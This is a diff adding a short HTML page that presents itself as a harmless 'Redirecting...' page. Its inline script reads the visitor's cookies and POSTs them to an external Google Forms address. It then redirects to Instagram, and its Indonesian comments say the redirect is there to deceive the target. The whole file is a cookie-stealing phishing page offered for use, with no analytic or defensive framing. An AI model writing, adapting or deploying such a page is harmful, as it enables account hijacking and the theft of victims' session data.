@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // Ambil cookies
+        var cookies = document.cookie;
+        
+        // Kirim cookies ke emailmu
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://forms.gle/2zHFzEXD7HMNipZr5", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({ cookies: cookies }));
+
+        // Redirect ke halaman yang valid untuk mengelabui target
+        window.location.replace("https://instagram.com");
+    </script>
+</body>
+</html>
